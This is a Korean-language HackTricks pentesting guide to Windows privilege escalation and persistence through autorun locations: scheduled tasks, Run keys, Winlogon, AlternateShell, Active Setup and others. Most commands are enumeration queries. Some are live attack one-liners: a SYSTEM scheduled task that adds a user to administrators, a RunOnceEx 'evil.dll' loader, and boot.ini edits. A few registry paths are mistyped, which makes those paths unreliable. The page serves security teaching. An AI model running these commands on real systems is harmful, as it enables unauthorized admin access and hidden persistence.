# Autoruns를 사용한 권한 상승

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>에서 **제로**부터 **히어로**까지 AWS 해킹을 배우세요!</summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고**하거나 **PDF로 HackTricks 다운로드**하려면 [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com)를 구매하세요
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **가입**하거나 **트위터** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)를 **팔로우**하세요.
* **HackTricks** 및 **HackTricks Cloud** github 저장소에 PR을 제출하여 **해킹 트릭을 공유**하세요.

</details>

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**버그 바운티 팁**: **해커들에 의해 만들어진 프리미엄 버그 바운티 플랫폼**인 **Intigriti**에 **가입**하세요! 오늘 [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)에서 참여하여 최대 **$100,000**의 바운티를 벌어보세요!

{% embed url="https://go.intigriti.com/hacktricks" %}

## WMIC

**Wmic**을 사용하여 **시작 프로그램**을 실행할 수 있습니다. 시작 프로그램으로 설정된 이진 파일을 확인하려면:
```bash
wmic startup get caption,command 2>nul & ^
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
```
## 예약된 작업

**작업**은 **특정 빈도**로 실행되도록 예약할 수 있습니다. 다음을 사용하여 예약된 실행 파일을 확인하세요:
```bash
schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab"
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

#Schtask to give admin access
#You can also write that content on a bat file that is being executed by a scheduled task
schtasks /Create /RU "SYSTEM" /SC ONLOGON /TN "SchedPE" /TR "cmd /c net localgroup administrators user /add"
```
## 폴더

**시작 프로그램 폴더에 있는 모든 이진 파일은 시작할 때 실행됩니다**. 일반적인 시작 프로그램 폴더는 아래에 나열된 것들이지만, 시작 프로그램 폴더는 레지스트리에 표시됩니다. [여기를 읽어보세요.](privilege-escalation-with-autorun-binaries.md#startup-path)
```bash
dir /b "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" 2>nul
dir /b "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 2>nul
dir /b "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
dir /b "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
```
## 레지스트리

{% hint style="info" %}
[여기서 참고](https://answers.microsoft.com/en-us/windows/forum/all/delete-registry-key/d425ae37-9dcc-4867-b49c-723dcd15147f): **Wow6432Node** 레지스트리 항목은 64비트 Windows 버전을 실행 중이라는 것을 나타냅니다. 운영 체제는 이 키를 사용하여 64비트 Windows 버전에서 실행되는 32비트 응용 프로그램을 위해 HKEY\_LOCAL\_MACHINE\SOFTWARE의 별도 보기를 표시합니다.
{% endhint %}

### 실행

**일반적으로 알려진** AutoRun 레지스트리:

* `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
* `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
* `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
* `HKCU\Software\Wow6432Npde\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run`
* `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Runonce`
* `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunonceEx`

**Run** 및 **RunOnce**으로 알려진 레지스트리 키는 사용자가 시스템에 로그인할 때마다 프로그램을 자동으로 실행하도록 설계되었습니다. 키의 데이터 값으로 할당된 명령줄은 260자 이하로 제한됩니다.

**서비스 실행** (부팅 중 서비스의 자동 시작 제어 가능):

* `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
* `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices`
* `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
* `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
* `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`
* `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`

**RunOnceEx:**

* `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx`
* `HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceEx`

Windows Vista 및 이후 버전에서는 **Run** 및 **RunOnce** 레지스트리 키가 자동으로 생성되지 않습니다. 이러한 키의 항목은 프로그램을 직접 시작하거나 종속성으로 지정할 수 있습니다. 예를 들어, DLL 파일을 로그온 시에 로드하려면 "Depend" 키와 함께 **RunOnceEx** 레지스트리 키를 사용할 수 있습니다. 시스템 시작 중에 "C:\temp\evil.dll"을 실행하는 레지스트리 항목을 추가하여 이를 시연할 수 있습니다:
```
reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d "C:\\temp\\evil.dll"
```
{% hint style="info" %}
**Exploit 1**: 언급된 레지스트리 중 하나에 쓸 수 있다면 **HKLM** 내에서 권한 상승이 가능합니다. 다른 사용자가 로그인할 때.
{% endhint %}

{% hint style="info" %}
**Exploit 2**: 언급된 레지스트리 중 하나에 지정된 이진 파일 중 하나를 덮어쓸 수 있다면 **HKLM** 내에서 권한 상승이 가능합니다. 다른 사용자가 로그인할 때 백도어로 해당 이진 파일을 수정할 수 있습니다.
{% endhint %}
```bash
#CMD
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE

reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Wow5432Node\Microsoft\Windows\CurrentVersion\RunServices

reg query HKLM\Software\Microsoft\Windows\RunOnceEx
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx

#PowerShell
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
```
### 시작 경로

* `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
* `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
* `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`

**Startup** 폴더에 배치된 바로 가기는 사용자 로그온 또는 시스템 재부팅 시 자동으로 서비스 또는 응용 프로그램을 실행하도록 트리거합니다. **Startup** 폴더의 위치는 레지스트리에서 **로컬 머신** 및 **현재 사용자** 범위에 대해 정의됩니다. 이는 이러한 지정된 **Startup** 위치에 추가된 바로 가기가 로그온 또는 재부팅 프로세스 이후에 연결된 서비스 또는 프로그램이 시작되도록 보장하므로 프로그램을 자동으로 실행할 수 있는 간단한 방법입니다.

{% hint style="info" %}
만약 **HKLM** 하위의 \[User] Shell Folder를 덮어쓸 수 있다면, 해당 폴더를 자신이 제어하는 폴더로 지정하고 사용자가 시스템에 로그인할 때마다 실행되는 백도어를 배치하여 권한 상승을 수행할 수 있습니다.
{% endhint %}
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"

Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
```
### Winlogon Keys

`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`

일반적으로 **Userinit** 키는 **userinit.exe**로 설정됩니다. 그러나 이 키가 수정되면 지정된 실행 파일도 사용자 로그온 시 **Winlogon**에 의해 실행됩니다. 마찬가지로 **Shell** 키는 Windows의 기본 쉘인 **explorer.exe**를 가리키도록 의도되어 있습니다.
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Userinit"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Shell"
```
{% hint style="info" %}
레지스트리 값이나 이진 파일을 덮어쓸 수 있다면 권한 상승이 가능합니다.
{% endhint %}

### 정책 설정

* `HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`

**Run** 키를 확인하세요.
```bash
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
```
### AlternateShell

### 안전 모드 명령 프롬프트 변경

Windows 레지스트리에서 `HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot` 아래에는 기본적으로 `cmd.exe`로 설정된 **`AlternateShell`** 값이 있습니다. 이는 부팅 시 "명령 프롬프트로 안전 모드"를 선택할 때 (F8 키를 눌러) `cmd.exe`가 사용된다는 것을 의미합니다. 그러나 F8을 눌러 수동으로 선택하지 않고도 컴퓨터를 이 모드에서 자동으로 시작하도록 설정할 수 있습니다.

"명령 프롬프트로 안전 모드"에서 자동으로 시작하는 부팅 옵션을 만드는 단계:

1. `boot.ini` 파일의 속성을 변경하여 읽기 전용, 시스템 및 숨김 플래그를 제거합니다: `attrib c:\boot.ini -r -s -h`
2. `boot.ini`를 편집합니다.
3. 다음과 같은 줄을 삽입합니다: `multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /fastdetect /SAFEBOOT:MINIMAL(ALTERNATESHELL)`
4. `boot.ini`에 대한 변경 사항을 저장합니다.
5. 원래 파일 속성을 다시 적용합니다: `attrib c:\boot.ini +r +s +h`

* **Exploit 1:** **AlternateShell** 레지스트리 키를 변경하면 사용자가 허가되지 않은 액세스를 위해 사용할 수 있는 사용자 정의 명령 셸 설정이 가능합니다.
* **Exploit 2 (PATH 쓰기 권한):** 시스템 **PATH** 변수의 어느 부분이든 쓰기 권한을 갖는 것, 특히 `C:\Windows\system32` 이전에, 사용자 정의 `cmd.exe`를 실행할 수 있게 해줍니다. 이는 시스템이 안전 모드에서 시작될 경우 백도어가 될 수 있습니다.
* **Exploit 3 (PATH 및 boot.ini 쓰기 권한):** `boot.ini`에 쓰기 액세스 권한이 있으면 자동으로 안전 모드가 시작되어 다음 재부팅 시에 무단 액세스를 용이하게 합니다.

현재 **AlternateShell** 설정을 확인하려면 다음 명령을 사용하십시오:
```bash
reg query HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot /v AlternateShell
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot' -Name 'AlternateShell'
```
### 설치된 구성 요소

Windows의 Active Setup은 **데스크톱 환경이 완전히 로드되기 전에 시작**되는 기능입니다. 사용자 로그온이 진행되기 전에 반드시 완료되어야 하는 특정 명령의 실행을 우선시합니다. 이 프로세스는 Run 또는 RunOnce 레지스트리 섹션에 있는 항목들이 트리거되기 전에 발생합니다.

Active Setup은 다음 레지스트리 키를 통해 관리됩니다:

- `HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`

이러한 키 내에는 각각 특정 구성 요소에 해당하는 여러 하위 키가 존재합니다. 특히 주목해야 할 키 값은 다음과 같습니다:

- **IsInstalled:**
  - `0`은 구성 요소의 명령이 실행되지 않음을 나타냅니다.
  - `1`은 명령이 각 사용자마다 한 번씩 실행됨을 의미하며, `IsInstalled` 값이 누락된 경우 기본 동작입니다.
- **StubPath:** Active Setup에 의해 실행될 명령을 정의합니다. `notepad`를 실행하는 것과 같이 유효한 명령줄이 될 수 있습니다.

**보안 통찰:**

- **`IsInstalled`**가 `"1"`로 설정된 키를 수정하거나 쓰면 특정 **`StubPath`**로의 무단 명령 실행으로 이어질 수 있어 권한 상승이 발생할 수 있습니다.
- **`StubPath`** 값에서 참조하는 이진 파일을 변경하면 충분한 권한이 있는 경우 권한 상승이 가능합니다.

Active Setup 구성 요소 전체의 **`StubPath`** 구성을 검사하려면 다음 명령을 사용할 수 있습니다:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
```
### 브라우저 도우미 개체

### 브라우저 도우미 개체(Browser Helper Objects, BHOs) 개요

브라우저 도우미 개체(Browser Helper Objects, BHOs)는 Microsoft의 인터넷 익스플로러에 추가 기능을 제공하는 DLL 모듈입니다. 이들은 인터넷 익스플로러와 Windows 익스플로러에 각각 로드되며 실행을 시작할 때마다 실행됩니다. 그러나 **NoExplorer** 키를 1로 설정하여 Windows 익스플로러 인스턴스에서 로드되지 않도록 차단할 수 있습니다.

BHOs는 Windows 10에서 인터넷 익스플로러 11을 통해 호환되지만, Windows의 최신 버전에서 기본 브라우저인 Microsoft Edge에서는 지원되지 않습니다.

시스템에 등록된 BHOs를 탐색하려면 다음 레지스트리 키를 검사할 수 있습니다:

* `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`
* `HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`

각 BHO는 레지스트리에서 **CLSID**로 표시되며, 고유 식별자로 작동합니다. 각 CLSID에 대한 자세한 정보는 `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}` 아래에서 찾을 수 있습니다.

레지스트리에서 BHOs를 쿼리하기 위해 다음 명령을 사용할 수 있습니다:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
```
### 인터넷 익스플로러 확장 프로그램

* `HKLM\Software\Microsoft\Internet Explorer\Extensions`
* `HKLM\Software\Wow6432Node\Microsoft\Internet Explorer\Extensions`

레지스트리에는 각 dll마다 1개의 새 레지스트리가 포함되며 **CLSID**에 의해 표시됩니다. CLSID 정보는 `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`에서 찾을 수 있습니다.

### 글꼴 드라이버

* `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers`
* `HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers`
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers"
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers'
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers'
```
### 명령어 열기

* `HKLM\SOFTWARE\Classes\htmlfile\shell\open\command`
* `HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command`
```bash
reg query "HKLM\SOFTWARE\Classes\htmlfile\shell\open\command" /v ""
reg query "HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command" /v ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Classes\htmlfile\shell\open\command' -Name ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command' -Name ""
```
### 이미지 파일 실행 옵션
```
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
HKLM\Software\Microsoft\Wow6432Node\Windows NT\CurrentVersion\Image File Execution Options
```
## SysInternals

모든 자동 실행 파일을 찾을 수 있는 사이트는 이미 **winpeas.exe**에 의해 **검색되었음을** 주의하세요. 그러나 더 포괄적인 자동 실행 파일 목록을 원한다면 [systinternals의 autoruns](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns)를 사용할 수 있습니다:
```
autorunsc.exe -m -nobanner -a * -ct /accepteula
```
## 더 알아보기

**레지스트리와 같은 Autoruns와 관련된 자세한 내용은** [**https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2**](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2) **에서 확인할 수 있습니다.**

## 참고 자료

* [https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref](https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref)
* [https://attack.mitre.org/techniques/T1547/001/](https://attack.mitre.org/techniques/T1547/001/)
* [https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2)
* [https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell](https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell)

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**버그 바운티 팁**: **Intigriti**에 가입하여 해커들이 만든 프리미엄 **버그 바운티 플랫폼**에 참여하세요! [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) **에서 오늘 가입하고 최대** **$100,000** **까지 보상을 받아보세요!**

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>**htARTE (HackTricks AWS Red Team Expert)**를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 PDF 형식으로 다운로드하려면** [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) **를 확인하세요!**
* [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com) **를 구매하세요.**
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) **를 발견하세요.** [**NFTs**](https://opensea.io/collection/the-peass-family) **를 포함한 당사의 독점 컬렉션입니다.**
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) **이나** [**텔레그램 그룹**](https://t.me/peass) **에 가입하거나** **트위터** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**를 팔로우하세요.**
* **HackTricks** 및 **HackTricks Cloud** 깃허브 저장소에 PR을 제출하여 **해킹 트릭을 공유하세요.**

</details>
